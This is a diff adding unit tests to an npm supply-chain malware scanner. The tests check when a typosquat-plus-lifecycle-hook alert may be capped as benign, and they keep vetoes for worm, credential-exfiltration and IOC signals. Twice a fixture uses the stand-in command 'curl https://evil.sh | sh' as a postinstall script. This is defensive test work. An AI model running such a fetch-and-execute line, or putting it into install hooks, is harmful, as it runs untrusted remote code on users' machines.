@@ -23,7 +23,9 @@ function runMLFeatureExtractorTests() {
     mcpServerEnvAccess,
     vendorCliSdk,
     aiAgentBot,
-    vendorMinifiedBundle
+    vendorMinifiedBundle,
+    typosquatBenignLifecycle,
+    isBenignLifecycleScript
   } = require('../../src/ml/feature-extractor');
   const { appendRecord, readRecords, getStats, relabelRecords, setTrainingFile, resetTrainingFile } = require('../../src/ml/jsonl-writer');
 
@@ -1007,6 +1009,221 @@ function runMLFeatureExtractorTests() {
     const meta = { registryMeta: { scripts: {} } };
     assert(vendorMinifiedBundle(result, meta) === false,
       'env_access on NPM_TOKEN inside the bundle is veto via hasBundleVetoSignal SENSITIVE_ENV_RE');
+  });
+
+  // ============================================================================
+  // Feature 13 — typosquat_benign_lifecycle (v2.11.28, weekly review 2026-05-22)
+  // ============================================================================
+  // Targets the boundary-squat cluster (@doyourjob/gravity-ui-page-constructor,
+  // magmastream, balena-cli, @1d1s/design-system, etc.) where the compound
+  // typosquat_lifecycle (CRITICAL) escalates a MEDIUM dependency_typosquat
+  // because of a provably benign lifecycle hook (husky install, npm run
+  // build, patches/apply-patches).
+
+  function makeTyposquatLifecycleThreats(extra = []) {
+    return [
+      { type: 'dependency_typosquat', severity: 'MEDIUM', file: 'package.json',
+        message: 'Dependency "plain-crypto-js" looks like a boundary-squat of "crypto-js".' },
+      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json',
+        message: 'Script "prepare" detected' },
+      { type: 'typosquat_lifecycle', severity: 'CRITICAL', file: 'package.json',
+        message: 'Boundary-squat dependency + lifecycle hook — install-time payload delivery.' },
+      ...extra
+    ];
+  }
+
+  // isBenignLifecycleScript: helper unit tests
+  test('isBenignLifecycleScript: TRUE for husky install', () => {
+    assert(isBenignLifecycleScript('husky install') === true, 'husky install should be benign');
+    assert(isBenignLifecycleScript('husky') === true, 'husky bare should be benign');
+  });
+
+  test('isBenignLifecycleScript: TRUE for patch-package patterns', () => {
+    assert(isBenignLifecycleScript('node patches/apply-patches.js') === true,
+      'balena-cli pattern should be benign');
+    assert(isBenignLifecycleScript('patch-package') === true, 'patch-package should be benign');
+  });
+
+  test('isBenignLifecycleScript: TRUE for npm run build:lib', () => {
+    assert(isBenignLifecycleScript('npm run build:lib') === true,
+      'scoped build script (@1d1s/design-system pattern) should be benign');
+    assert(isBenignLifecycleScript('npm run build') === true,
+      'npm run build should be benign (also via isSafeLifecycleScript)');
+  });
+
+  test('isBenignLifecycleScript: TRUE for is-ci || X guard wrapper', () => {
+    assert(isBenignLifecycleScript('is-ci || husky install') === true,
+      'is-ci guard around husky install should be benign');
+  });
+
+  test('isBenignLifecycleScript: FALSE for curl evil.sh | sh', () => {
+    assert(isBenignLifecycleScript('curl https://evil.sh | sh') === false,
+      'remote shell exec must never be benign');
+    assert(isBenignLifecycleScript('node ./install.js') === false,
+      'unknown node script must not be auto-benign');
+  });
+
+  test('isBenignLifecycleScript: FALSE for empty / null', () => {
+    assert(isBenignLifecycleScript('') === false, 'empty string is not benign');
+    assert(isBenignLifecycleScript(null) === false, 'null is not benign');
+    assert(isBenignLifecycleScript(undefined) === false, 'undefined is not benign');
+  });
+
+  // Feature 13 — POSITIVE
+  test('typosquat_benign_lifecycle: TRUE for @doyourjob-style fork with husky install prepare', () => {
+    const result = { threats: makeTyposquatLifecycleThreats() };
+    const meta = { name: '@doyourjob/gravity-ui-page-constructor',
+      registryMeta: { scripts: { prepare: 'husky install' } } };
+    assert(typosquatBenignLifecycle(result, meta) === true,
+      'husky install prepare on boundary-squat fork should cap to MEDIUM');
+  });
+
+  test('typosquat_benign_lifecycle: TRUE for balena-cli style (postinstall patches/apply-patches)', () => {
+    const result = { threats: makeTyposquatLifecycleThreats() };
+    const meta = { name: 'balena-cli',
+      registryMeta: { scripts: { postinstall: 'node patches/apply-patches.js' } } };
+    assert(typosquatBenignLifecycle(result, meta) === true,
+      'patch-package pattern via apply-patches.js must be recognized as benign');
+  });
+
+  test('typosquat_benign_lifecycle: TRUE for magmastream style (prepare: npm run build)', () => {
+    const result = { threats: makeTyposquatLifecycleThreats() };
+    const meta = { name: 'magmastream',
+      registryMeta: { scripts: { prepare: 'npm run build' } } };
+    assert(typosquatBenignLifecycle(result, meta) === true,
+      'npm run build prepare on unique-name unscoped package should cap');
+  });
+
+  test('typosquat_benign_lifecycle: TRUE for @1d1s/design-system style (prepare: npm run build:lib)', () => {
+    const result = { threats: makeTyposquatLifecycleThreats() };
+    const meta = { name: '@1d1s/design-system',
+      registryMeta: { scripts: { prepare: 'npm run build:lib' } } };
+    assert(typosquatBenignLifecycle(result, meta) === true,
+      'scoped npm run build:lib should be recognized');
+  });
+
+  test('typosquat_benign_lifecycle: TRUE with typosquat_detected variant (Levenshtein path)', () => {
+    const result = {
+      threats: [
+        { type: 'typosquat_detected', severity: 'HIGH', file: 'package.json',
+          message: 'Package "lodahs" resembles "lodash" (missing_char).' },
+        { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json' },
+        { type: 'typosquat_lifecycle', severity: 'CRITICAL', file: 'package.json' }
+      ]
+    };
+    const meta = { name: 'some-pkg', registryMeta: { scripts: { prepare: 'npm run build' } } };
+    assert(typosquatBenignLifecycle(result, meta) === true,
+      'Levenshtein-based typosquat_detected path also covered by F13');
+  });
+
+  // Feature 13 — NEGATIVE (veto signals — must preserve real detections)
+  test('typosquat_benign_lifecycle: FALSE on Axios UNC1069 (dependency_typosquat_used in source)', () => {
+    const result = {
+      threats: makeTyposquatLifecycleThreats([
+        { type: 'dependency_typosquat_used', severity: 'MEDIUM', file: 'src/wrapper.js',
+          message: 'Boundary-squat dep "plain-crypto-js" is require()d in source code' }
+      ])
+    };
+    const meta = { name: 'crypto-wrapper',
+      registryMeta: { scripts: { postinstall: 'npm run build' } } };
+    assert(typosquatBenignLifecycle(result, meta) === false,
+      'Axios UNC1069 discriminator: require()d dep means the squat is real, no cap');
+  });
+
+  test('typosquat_benign_lifecycle: FALSE on dependency_typosquat_require compound (Axios UNC1069)', () => {
+    const result = {
+      threats: makeTyposquatLifecycleThreats([
+        { type: 'dependency_typosquat_require', severity: 'CRITICAL', file: 'package.json',
+          message: 'Boundary-squat dep declared AND require()d — Axios UNC1069.' }
+      ])
+    };
+    const meta = { name: 'crypto-wrapper',
+      registryMeta: { scripts: { postinstall: 'husky install' } } };
+    assert(typosquatBenignLifecycle(result, meta) === false,
+      'Axios UNC1069 critical compound must never be capped');
+  });
+
+  test('typosquat_benign_lifecycle: FALSE on Shai-Hulud worm (npm_publish_worm + node_modules_write)', () => {
+    const result = {
+      threats: makeTyposquatLifecycleThreats([
+        { type: 'npm_publish_worm', severity: 'CRITICAL', file: 'index.js' },
+        { type: 'node_modules_write', severity: 'CRITICAL', file: 'index.js' }
+      ])
+    };
+    const meta = { name: 'pkg', registryMeta: { scripts: { postinstall: 'npm run build' } } };
+    assert(typosquatBenignLifecycle(result, meta) === false,
+      'Shai-Hulud worm must never be capped');
+  });
+
+  test('typosquat_benign_lifecycle: FALSE on IOC hit', () => {
+    const result = {
+      threats: makeTyposquatLifecycleThreats([
+        { type: 'ioc_match', severity: 'CRITICAL', file: 'index.js',
+          message: 'Hash matches known malicious payload.' }
+      ])
+    };
+    const meta = { name: 'pkg', registryMeta: { scripts: { prepare: 'npm run build' } } };
+    assert(typosquatBenignLifecycle(result, meta) === false,
+      'IOC hit must never be capped regardless of lifecycle benignness');
+  });
+
+  test('typosquat_benign_lifecycle: FALSE on suspicious_dataflow / intent_credential_exfil', () => {
+    const result = {
+      threats: makeTyposquatLifecycleThreats([
+        { type: 'suspicious_dataflow', severity: 'CRITICAL', file: 'index.js' }
+      ])
+    };
+    const meta = { name: 'pkg', registryMeta: { scripts: { postinstall: 'npm run build' } } };
+    assert(typosquatBenignLifecycle(result, meta) === false,
+      'real exfil signal must never be capped');
+
+    const result2 = {
+      threats: makeTyposquatLifecycleThreats([
+        { type: 'intent_credential_exfil', severity: 'CRITICAL', message: 'env -> network sink' }
+      ])
+    };
+    assert(typosquatBenignLifecycle(result2, meta) === false,
+      'intent_credential_exfil must never be capped');
+  });
+
+  test('typosquat_benign_lifecycle: FALSE on non-benign postinstall (curl evil.sh | sh)', () => {
+    const result = { threats: makeTyposquatLifecycleThreats() };
+    const meta = { name: 'pkg',
+      registryMeta: { scripts: { postinstall: 'curl https://evil.sh | sh' } } };
+    assert(typosquatBenignLifecycle(result, meta) === false,
+      'non-benign postinstall script must fail the cap');
+  });
+
+  test('typosquat_benign_lifecycle: FALSE on DPRK detached_credential_exfil', () => {
+    const result = {
+      threats: makeTyposquatLifecycleThreats([
+        { type: 'detached_credential_exfil', severity: 'CRITICAL', file: 'index.js',
+          message: 'spawn detached + env + network — DPRK pattern' }
+      ])
+    };
+    const meta = { name: 'pkg', registryMeta: { scripts: { prepare: 'husky install' } } };
+    assert(typosquatBenignLifecycle(result, meta) === false,
+      'DPRK detached exfil signature must never be capped');
+  });
+
+  test('typosquat_benign_lifecycle: FALSE when compound typosquat_lifecycle is absent', () => {
+    const result = {
+      threats: [
+        { type: 'dependency_typosquat', severity: 'MEDIUM', file: 'package.json' },
+        { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json' }
+        // no compound — cap requires it as a positive trigger
+      ]
+    };
+    const meta = { name: 'pkg', registryMeta: { scripts: { prepare: 'npm run build' } } };
+    assert(typosquatBenignLifecycle(result, meta) === false,
+      'no typosquat_lifecycle compound means the cluster did not fire — no cap');
+  });
+
+  test('typosquat_benign_lifecycle: FALSE when no scripts declared', () => {
+    const result = { threats: makeTyposquatLifecycleThreats() };
+    const meta = { name: 'pkg', registryMeta: { scripts: {} } };
+    assert(typosquatBenignLifecycle(result, meta) === false,
+      'no declared script means we cannot prove benign-ness');
   });
 
   // Feature 4: git_hook_source_local — POSITIVE
